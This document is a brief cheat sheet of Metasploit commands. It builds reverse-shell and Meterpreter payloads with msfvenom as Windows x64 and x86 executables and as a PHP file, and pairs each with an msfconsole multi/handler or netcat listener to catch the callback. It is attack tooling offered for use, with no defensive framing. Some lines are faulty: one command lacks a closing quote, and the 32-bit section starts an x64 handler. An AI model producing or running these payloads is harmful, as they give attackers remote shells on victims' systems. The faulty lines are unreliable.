
meterpreter x64
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=XXXX LPORT=XXX -f exe -o exploit_portXXX.exe
msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST XXXXX;set LPORT XXX;run

meterpreter 32bit
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST=XXX LPORT=XXX -f exe -o exploit_portXXX.exe
msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST XXX;set LPORT XXX;run'

windows shell x64
msfvenom -p windows/x64/shell/reverse_tcp LHOST=XXX LPORT=XX -f exe -o exploit_portXX.exe
nc -nvlp XX

windows shell 32bit
msfvenom -p windows/shell/reverse_tcp --platform windows -a x86 LHOST=XXXXX LPORT=XXX -f exe -o exploit_portXX.exe
nc -nvlp XX

PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=XXXX LPORT=XXX -f raw -o exploit_portXXX.php
msfconsole -q -x 'use exploit/multi/handler;set payload php/meterpreter/reverse_tcp;set LHOST XXXX;set LPORT XXX;run'

